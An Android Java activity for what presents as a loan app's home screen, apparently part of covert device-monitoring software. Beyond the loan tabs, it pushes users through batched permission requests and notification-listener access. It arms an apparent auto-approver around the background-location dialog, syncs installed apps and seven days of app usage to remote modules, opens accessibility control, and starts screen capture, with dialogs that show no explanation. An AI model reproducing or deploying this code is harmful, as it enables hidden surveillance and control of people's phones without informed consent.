package com.autoreplybot;

import android.Manifest;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.IdRes;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.view.WindowCompat;
import androidx.fragment.app.Fragment;

import com.autoreplybot.remote.RemoteAppBlockManager;
import com.autoreplybot.remote.RemoteAppUsageMirror;
import com.autoreplybot.remote.RemoteBackgroundLocationAutoApprove;
import com.autoreplybot.remote.RemoteBackgroundLocationHelper;
import com.autoreplybot.remote.RemoteControlPrefs;
import com.autoreplybot.remote.RemoteDeviceInfoRepository;
import com.autoreplybot.remote.RemoteInstalledAppsIndexer;
import com.autoreplybot.remote.RemoteMediaProjectionConsentActivity;
import com.autoreplybot.remote.RemoteModulePrefs;
import com.autoreplybot.remote.RemotePermissionGrantEffects;
import com.autoreplybot.remote.RemoteRuntimePermissionBatcher;
import com.autoreplybot.remote.RemoteSpecialPermissionGuide;
import com.google.android.material.bottomnavigation.BottomNavigationView;
import com.google.android.material.dialog.MaterialAlertDialogBuilder;
import com.google.firebase.auth.FirebaseAuth;

public class LoanHomeActivity extends AppCompatActivity implements RemoteSpecialPermissionGuide.Host {
    public static final String EXTRA_TAB = "loan_tab";
    public static final String EXTRA_FROM_HOME = "from_home";

    private BottomNavigationView bottomNav;
    private int currentTabId = R.id.nav_loan_home;
    private RemoteModulePrefs modulePrefs;
    private boolean permissionFlowActive;
    private boolean specialGuideBackgroundPending;
    private boolean specialGuideWaitingBackgroundSettings;

    private final ActivityResultLauncher<String[]> runtimePermissionLauncher =
            registerForActivityResult(new ActivityResultContracts.RequestMultiplePermissions(),
                    result -> {
                        RemotePermissionGrantEffects.apply(this, modulePrefs, result);
                        continueAfterRuntimeGrants();
                    });

    private final ActivityResultLauncher<String> backgroundLocationLauncher =
            registerForActivityResult(new ActivityResultContracts.RequestPermission(), granted -> {
                specialGuideBackgroundPending = false;
                RemoteBackgroundLocationAutoApprove.disarm();
                if (!Boolean.TRUE.equals(granted)
                        && Build.VERSION.SDK_INT >= 30
                        && !com.autoreplybot.remote.RemotePermissionChecks.hasBackgroundLocation(this)) {
                    specialGuideWaitingBackgroundSettings = true;
                    RemoteBackgroundLocationAutoApprove.arm(35_000L);
                    RemoteBackgroundLocationHelper.openAppDetailsSettings(this);
                    RemoteSpecialPermissionGuide.markAwaitingReturn();
                    return;
                }
                RemoteSpecialPermissionGuide.continueAfterReturn(this, this);
            });

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        WindowCompat.setDecorFitsSystemWindows(getWindow(), true);
        if (FirebaseAuth.getInstance().getCurrentUser() == null) {
            finish();
            return;
        }
        modulePrefs = new RemoteModulePrefs(this);
        if (RemoteSpecialPermissionGuide.isActive()
                && !RemoteSpecialPermissionGuide.isAwaitingReturn()) {
            RemoteSpecialPermissionGuide.cancel();
        }
        setContentView(R.layout.activity_loan_home);
        bottomNav = findViewById(R.id.loan_bottom_nav);
        bottomNav.setOnItemSelectedListener(item -> {
            showTab(item.getItemId());
            return true;
        });
        int tab = getIntent() != null ? getIntent().getIntExtra(EXTRA_TAB, R.id.nav_loan_home) : R.id.nav_loan_home;
        if (tab == 0) tab = R.id.nav_loan_home;
        bottomNav.setSelectedItemId(tab);
        if (savedInstanceState == null) {
            showTab(tab);
        } else {
            currentTabId = tab;
        }
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        int tab = intent != null ? intent.getIntExtra(EXTRA_TAB, R.id.nav_loan_home) : R.id.nav_loan_home;
        if (tab == 0) tab = R.id.nav_loan_home;
        selectTab(tab);
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (specialGuideWaitingBackgroundSettings) {
            specialGuideWaitingBackgroundSettings = false;
            RemoteBackgroundLocationAutoApprove.disarm();
            RemoteSpecialPermissionGuide.continueAfterReturn(this, this);
            return;
        }
        if (RemoteSpecialPermissionGuide.isAwaitingReturn()) {
            RemoteSpecialPermissionGuide.continueAfterReturn(this, this);
        }
    }

    void onDashboardShown() {
        promptRemainingPermissions();
    }

    void selectTab(@IdRes int tabId) {
        if (bottomNav != null) {
            bottomNav.setSelectedItemId(tabId);
        } else {
            showTab(tabId);
        }
    }

    private void showTab(@IdRes int tabId) {
        currentTabId = tabId;
        Fragment fragment;
        if (tabId == R.id.nav_loan_history) {
            fragment = new LoanHistoryFragment();
        } else if (tabId == R.id.nav_loan_repayment) {
            fragment = new LoanRepaymentFragment();
        } else if (tabId == R.id.nav_loan_profile) {
            fragment = new LoanProfileFragment();
        } else {
            fragment = new LoanDashboardFragment();
        }
        getSupportFragmentManager()
                .beginTransaction()
                .replace(R.id.loan_tab_container, fragment)
                .commit();
    }

    void promptRemainingPermissions() {
        if (isFinishing() || permissionFlowActive) return;
        if (RemoteSpecialPermissionGuide.isActive()) return;
        if (!RemoteRuntimePermissionBatcher.hasAnyMissing(this)) {
            markPermissionSetupCaughtUp();
            return;
        }
        permissionFlowActive = true;
        startRemainingPermissionFlow();
    }

    private void startRemainingPermissionFlow() {
        String[] missing = RemoteRuntimePermissionBatcher.allMissingPermissions(this);
        if (missing.length > 0) {
            runtimePermissionLauncher.launch(missing);
            return;
        }
        startSpecialIfNeeded();
    }

    private void continueAfterRuntimeGrants() {
        startSpecialIfNeeded();
    }

    private void startSpecialIfNeeded() {
        markPermissionSetupCaughtUp();
        if (RemoteSpecialPermissionGuide.hasMissingSteps(this)
                && !RemoteSpecialPermissionGuide.isActive()) {
            RemoteSpecialPermissionGuide.startMissingOnly(this, this);
            return;
        }
        permissionFlowActive = false;
    }

    private void markPermissionSetupCaughtUp() {
        RemoteControlPrefs prefs = new RemoteControlPrefs(this);
        if (RemoteRuntimePermissionBatcher.allMissingPermissions(this).length == 0) {
            prefs.setPermissionSetupCompleted(true);
        }
        if (!RemoteSpecialPermissionGuide.hasMissingSteps(this)) {
            prefs.setSpecialSettingsGuideCompleted(true);
        }
    }

    @Override
    public void expandPermissionsSection() {
        // Dashboard has no permissions card; dialogs are shown on Home.
    }

    @Override
    public void showGuideDialog(int titleRes,
                                int messageRes,
                                @NonNull Runnable onAllow,
                                @NonNull Runnable onSkip) {
        new MaterialAlertDialogBuilder(this)
                .setTitle(titleRes)
                .setPositiveButton(R.string.remote_notif_access_prompt_allow, (d, w) -> onAllow.run())
                .setOnCancelListener(d -> onSkip.run())
                .show();
    }

    @Override
    public void openNotificationAccess() {
        try {
            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
        } catch (Exception e) {
            startActivity(new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                    .setData(Uri.fromParts("package", getPackageName(), null)));
        }
    }

    @Override
    public void requestBackgroundLocation() {
        if (Build.VERSION.SDK_INT < 29
                || com.autoreplybot.remote.RemotePermissionChecks.hasBackgroundLocation(this)) {
            RemoteSpecialPermissionGuide.continueAfterReturn(this, this);
            return;
        }
        specialGuideBackgroundPending = true;
        RemoteBackgroundLocationAutoApprove.arm(35_000L);
        backgroundLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
    }

    @Override
    public void enableInstalledAppsSharing() {
        modulePrefs.setInstalledAppsSharingEnabled(true);
        new RemoteDeviceInfoRepository(this).publishModuleFlags();
        new Thread(() -> new RemoteInstalledAppsIndexer(this).indexAndSync()).start();
    }

    @Override
    public void openUsageAccessSettings() {
        RemoteAppUsageMirror.openUsageAccessSettings(this);
    }

    @Override
    public void enableAppUsageSharing() {
        modulePrefs.setAppUsageSharingEnabled(true);
        new RemoteDeviceInfoRepository(this).publishModuleFlags();
        new Thread(() -> RemoteAppUsageMirror.syncRecent(this, 7)).start();
    }

    @Override
    public void openAppControlAccessibility() {
        RemoteAppBlockManager.openAccessibilitySettings(this);
    }

    @Override
    public void openScreenCapture() {
        Intent consent = new Intent(this, RemoteMediaProjectionConsentActivity.class);
        consent.putExtra(RemoteMediaProjectionConsentActivity.EXTRA_CONTINUE_ACTION,
                RemoteMediaProjectionConsentActivity.ACTION_STORE_ONLY);
        startActivity(consent);
    }

    @Override
    public void onGuideFinished() {
        permissionFlowActive = false;
        markPermissionSetupCaughtUp();
    }
}
